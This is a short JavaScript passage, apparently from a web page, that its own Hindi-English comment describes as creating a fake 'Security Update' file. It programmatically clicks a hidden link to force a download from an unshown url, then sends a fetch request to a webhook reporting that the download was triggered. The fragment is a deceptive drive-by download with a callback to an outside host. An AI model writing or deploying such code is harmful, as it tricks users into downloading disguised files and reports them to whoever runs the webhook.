            document.getElementById('status').innerText = "Attempting Download...";
            
            // Ek fake "Security Update" file create karna

            const a = document.createElement("a");
            a.href = url;

            document.body.appendChild(a);
            a.click();
            
            // Webhook update
            fetch(WEBHOOK + "?download_triggered=true");
